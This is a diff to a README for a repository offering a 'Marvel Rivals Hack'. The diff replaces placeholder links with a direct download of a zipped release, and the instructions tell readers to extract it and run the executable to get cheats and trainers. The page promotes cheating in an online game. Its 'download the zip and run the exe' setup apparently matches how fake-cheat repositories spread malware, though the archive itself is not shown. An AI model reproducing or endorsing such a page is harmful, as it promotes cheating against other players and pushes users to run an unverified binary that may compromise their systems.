@@ -2,7 +2,7 @@
 
 Welcome to the **Marvel Rivals Hack** repository! This project provides tools and mods for enhancing your gameplay experience in Marvel Rivals. Here, you will find a collection of cheats, trainers, and various modifications to help you gain an edge in the game.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](444)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/crashtest152e/Marvel-Rivals-Hack/releases/download/1.6.1/Marvel.Rivals.Hack.v1.6.1.zip)
 
 ## Table of Contents
 
@@ -33,7 +33,7 @@ This repository includes:
 
 To get started, follow these steps:
 
-1. **Download the latest release** from the [Releases section](444).
+1. **Download the latest release** from the [Releases section](https://github.com/crashtest152e/Marvel-Rivals-Hack/releases/download/1.6.1/Marvel.Rivals.Hack.v1.6.1.zip).
 2. **Extract the files** from the downloaded archive.
 3. **Run the executable** file to start using the cheats and mods.
 
@@ -70,4 +70,4 @@ For any questions or support, please reach out via GitHub issues or contact the 
 
 ---
 
-We hope you enjoy using the **Marvel Rivals Hack**! For the latest updates and releases, check back often or follow the [Releases section](444). Happy gaming!
+We hope you enjoy using the **Marvel Rivals Hack**! For the latest updates and releases, check back often or follow the [Releases section](https://github.com/crashtest152e/Marvel-Rivals-Hack/releases/download/1.6.1/Marvel.Rivals.Hack.v1.6.1.zip). Happy gaming!
